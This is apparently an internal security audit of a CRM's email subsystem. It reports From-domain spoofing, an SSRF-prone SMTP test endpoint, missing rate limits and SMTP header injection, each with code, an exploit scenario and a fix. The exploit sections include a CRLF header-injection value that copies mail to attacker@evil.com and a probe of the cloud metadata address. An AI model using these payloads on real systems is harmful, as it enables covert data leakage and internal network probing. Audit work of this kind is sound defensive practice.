# T15 — SMTP Relay Abuse, From-Domain Spoofing, Provider Impersonation

**Auditor slot:** T15  
**Files examined:** `services/email.ts`, `routes/settings.routes.ts`, `routes/notifications.routes.ts`, `routes/campaigns.routes.ts`, `routes/reports.routes.ts`, `routes/automations.routes.ts`, `services/automations.ts`, `services/dunningScheduler.ts`, `services/reportEmailer.ts`, `services/scheduledReports.ts`, `services/sampleData.ts`, `routes/onboarding.routes.ts`, `routes/signup.routes.ts`, `utils/configEncryption.ts`, `utils/ssrfGuard.ts`, migrations `012_notification_templates.sql`, `090_reports_bi_enhancements.sql`

---

### MEDIUM No domain-ownership check on `from_email` / `smtp_from` — any tenant can set `from: victim@competitor.com`

**Where:** `packages/server/src/services/email.ts:67–112` and `packages/server/src/routes/settings.routes.ts:439–480`

**What:**
The `from_email` / `smtp_from` fields stored in `store_config` are the outbound SMTP `From:` address for all tenant email (receipts, dunning, campaigns, auto-notifications). The only validation applied is `EMAIL_FROM_RE` — a loose regex that checks for `@` and a dot. There is no check that the domain in `from_email` matches (or is owned by) the tenant's SMTP `smtp_user` domain or any verified domain. A tenant who configures SMTP credentials for their own relay (e.g. `smtp.mailgun.org` with their API key) and then sets `from_email: noreply@apple.com` will send all outbound emails with `From: noreply@apple.com` through their relay. Whether the message survives SPF/DKIM/DMARC depends entirely on the relay's policies — many relays (Mailgun "flex" domains, SendGrid, SES relay-mode) do NOT enforce that the envelope `From` domain is one the account has verified. The server never performs a DNS check on the sender domain nor does it compare the `from_email` domain against the `smtp_user` / `smtp_host`.

**Code:**
```typescript
// services/email.ts:67-112 (getSmtpConfig)
const fromEmailRaw = get('from_email').trim();
// EMAIL_FROM_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/  — format only, no domain-ownership check
if (fromEmailRaw && EMAIL_FROM_RE.test(fromEmailRaw)) {
  from = fromEmailRaw;  // set to ANY email address the tenant stored
  fromSource = 'from_email';
} else if (smtpFrom) {
  from = smtpFrom;  // or smtp_from — also unchecked for domain ownership
```

**Exploit:**
Admin of tenant "badactor" configures their own Mailgun relay (which passes SPF for `mailgun.org`), sets `from_email = noreply@bizarrecrm.com` (or any victim domain), then triggers a bulk campaign or dunning send. Thousands of customers receive email appearing to originate from `noreply@bizarrecrm.com` (or `support@apple.com`, etc.), bypassing DMARC if the relay's signing domain doesn't align with the From domain. This enables phishing at scale attributed to the victim domain.

**Fix:**
At the time `from_email` is stored via `PUT /config`, validate that the `from_email` domain exactly matches the `smtp_user` domain (or is an explicit allowlist maintained by super-admin per tenant). For SaaS relay providers (Mailgun, SendGrid, SES) that support verified-sender lists, reject any `from_email` whose domain isn't verified in that account. At minimum, add a server-side warning/block when the `from_email` domain differs from the `smtp_user` domain.

---

### MEDIUM No rate limit on `POST /settings/email/test-smtp` — SSRF probe + connection-spam vector

**Where:** `packages/server/src/routes/settings.routes.ts:1877–1905`

**What:**
The `POST /settings/email/test-smtp` endpoint accepts an arbitrary `host` and `port` in the request body, opens a nodemailer transporter to that host, calls `.verify()` (which initiates a full SMTP handshake), and returns the banner / error. There is no rate limit on this endpoint and no SSRF guard — `assertPublicUrl` / `ssrfGuard.ts` is never called. An admin can supply `host: 169.254.169.254`, `host: 10.0.0.1`, or any internal hostname and receive the SMTP banner (or a TCP-connect error whose message often reveals whether a port is open), amounting to a credentialed internal network port-scanner. Likewise, there is no per-admin rate limit, so a script can hammer this endpoint to exhaust TCP connection slots or trigger connection-limit bans on external SMTP servers.

**Code:**
```typescript
// settings.routes.ts:1877-1897
router.post('/email/test-smtp', adminOnly, async (req, res, next) => {
  const { host, port, user, pass } = req.body;
  if (!host) throw new AppError('smtp_host is required', 400);
  const portNum = port ? parseInt(String(port), 10) : 587;
  // No SSRF guard, no private-IP block, no rate limit
  const transport = nodemailer.createTransport({
    host: String(host).trim(),   // ← any IP/hostname accepted
    port: portNum,
    ...
  });
  await transport.verify();      // ← initiates TCP + SMTP handshake to supplied host
  transport.close();
```

**Exploit:**
A compromised admin account (or a legitimate admin on a free-tier plan) calls `POST /settings/email/test-smtp` with `{"host":"169.254.169.254","port":25}` and reads the banner to confirm cloud IMDS reachability, then probes RFC-1918 space systematically. Even without credentials, banner grabbing on ports 25/465/587 across the internal network reveals service topology. No account lockout or rate limit protects against automated scanning.

**Fix:**
Apply the existing `ssrfGuard.ts` `assertPublicUrl` logic (adapted for raw hostnames rather than URLs) before creating the nodemailer transport. Also add a per-admin rate limit (e.g. 5 requests per minute) via `checkWindowRate`. Note: the SMS `test-send` and `test-connection` endpoints (lines 1704 and 1838) similarly lack rate limits and should receive the same treatment.

---

### MEDIUM No rate limit on `POST /notifications/send-receipt` (email path) — unlimited authenticated relay abuse

**Where:** `packages/server/src/routes/notifications.routes.ts:205–357`

**What:**
`POST /notifications/send-receipt` sends a full HTML receipt email via the tenant's SMTP to the invoice's customer address. It enforces manager-or-admin role and verifies `recipient_email === invoice.customer_email` (SCAN-811), but there is no per-user or per-tenant rate limit on the email dispatch path. The parallel SMS receipt endpoint (`/send-receipt-sms`) explicitly enforces 30/min per user at line 375. The email path was never given equivalent protection. An admin/manager can iterate over all invoice IDs in a loop and re-send receipts at full request throughput — potentially thousands of emails per minute — burning SMTP quota, triggering domain reputation damage, or harassing individual customers.

**Code:**
```typescript
// notifications.routes.ts:207-357  (send-receipt email path)
router.post('/send-receipt', asyncHandler(async (req, res) => {
  requireManagerOrAdmin(req);
  // ... invoice lookup + SCAN-811 customer-match check ...
  // No rate limit — compare to /send-receipt-sms at line 375:
  //   if (!checkWindowRate(db, 'receipt_sms', String(userId), 30, 60_000)) {
  //     throw new AppError('Rate limit exceeded. Try again shortly.', 429);
```

**Exploit:**
Manager calls `POST /notifications/send-receipt` in a tight loop over all invoice IDs. The server forwards each to the SMTP relay with no throttle. 10,000 emails per minute is plausible over a fast LAN, enough to exhaust a Mailgun/SendGrid free-tier daily limit in seconds, or to flood a customer's inbox with repeated receipts (harassment / spam complaint vector that gets the tenant's sending domain/IP blacklisted).

**Fix:**
Add `checkWindowRate(db, 'receipt_email', String(userId), 30, 60_000)` immediately after `requireManagerOrAdmin(req)` at line 210, matching the SMS path at line 375. Consider a per-invoice-id idempotency guard (e.g. a cooldown of 5 minutes before the same invoice can be re-sent) as defense-in-depth.

---

### MEDIUM `PUT /store` saves `smtp_from` without email-format validation — SMTP header injection bypass

**Where:** `packages/server/src/routes/settings.routes.ts:570–598`

**What:**
There are two endpoints that persist SMTP config: `PUT /config` (line 482) runs `validateConfigValue()` which calls `EMAIL_RE.test()` on `smtp_from` because it is in `EMAIL_SETTINGS`, and rejects malformed values. `PUT /store` (line 570) has its own hardcoded `allowed` list that includes `smtp_from` but skips `validateConfigValue` entirely — it writes the raw string directly to `store_config`. An admin can therefore store a header-injection payload (`smtp_from: "legit\r\nBcc: victim@example.com"`) via `PUT /store`, which then flows into `getSmtpConfig()` at `email.ts:76–90` and becomes the nodemailer `from:` field. `sanitizeSubject` in `email.ts:157–159` strips `\r\n` from the subject, but the `from` address is never sanitized.

**Code:**
```typescript
// settings.routes.ts:578-583 — PUT /store, smtp_from accepted with no validation
const allowed = ['store_name','address','phone','email','timezone','currency','tax_rate',
  'receipt_header','receipt_footer','logo_url','sms_provider','tcx_host','tcx_extension',
  'tcx_password','smtp_host','smtp_port','smtp_user','smtp_from','business_hours','store_logo'];
for (const [key, value] of Object.entries(req.body)) {
  if (!allowed.includes(key)) continue;
  await adb.run('INSERT OR REPLACE INTO store_config (key, value) VALUES (?, ?)', key, strVal);
  // ↑ no validateConfigValue call — smtp_from with CRLF is stored as-is
```

**Exploit:**
Admin sets `smtp_from` to `noreply@shop.com\r\nBcc: attacker@evil.com` via `PUT /store`. On next email dispatch (receipt, campaign, dunning), nodemailer injects the `Bcc` header into every outbound message, silently copying attacker. Additionally, a crafted `smtp_from` containing `\r\nSubject: override` can replace the email subject.

**Fix:**
Apply `validateConfigValue` in `PUT /store` for all keys that are also in `ALLOWED_CONFIG_KEYS` and `EMAIL_SETTINGS`. The simplest fix is to replace the inline allowlist-loop in `PUT /store` with a call to the same `validateConfigValue` guard used in `PUT /config`, or at minimum add `EMAIL_RE.test(value)` for `smtp_from` / `smtp_user` / `store_email` before the `adb.run` insert.

---

### INFO No server-side DKIM/SPF/DMARC alignment check before sending

**Where:** `packages/server/src/services/email.ts` (entire file)

**What:**
The server never performs a DNS lookup to verify SPF/DKIM/DMARC alignment between the configured `from_email` domain and the `smtp_host` before accepting SMTP credentials. This is expected of a CRM relay (SPF/DKIM are configured at the DNS/relay layer, not the application layer), but combined with finding 1 (no domain-ownership check) the absence of any server-side DNS verification means the application provides no warning when a tenant's `from_email` domain will fail DMARC alignment. A future hardening option would be to perform a permissive SPF TXT lookup on the `from_email` domain and warn (not block) if the configured `smtp_host` is not in the SPF record.

**Fix:**
Informational — no urgent code change. Consider adding a background verification step (async, non-blocking) that queries SPF/DMARC DNS records on the `from_email` domain when SMTP credentials are saved and logs a warning if the `smtp_host` IP is outside the declared SPF policy. This surfaces misconfiguration before production sends fail with bounces.

---

### INFO Sample-data customers use `@example.com` addresses — safe, no real email risk

**Where:** `packages/server/src/services/sampleData.ts:84–88`

**What:**
The five hardcoded sample customers (`alex.demo@example.com`, `jamie.sample@example.com`, etc.) all use the IANA-reserved `example.com` domain, which does not accept email. If `send_email_auto` or a campaign fires against sample data before the tenant deletes it, the messages are guaranteed to bounce rather than reach real inboxes. No real-person address is hardcoded in sample data.

**Fix:**
No action required. Observation for completeness.

---

## Summary

| Sev | Count |
|-----|-------|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 4 |
| LOW | 0 |
| INFO | 2 |

**Most impactful finding:** T15 MEDIUM #1 — tenants can set `from_email` to any arbitrary domain with no ownership verification, enabling From-address spoofing through their own SMTP relay to impersonate Bizarre CRM or competitor brands in bulk mail.
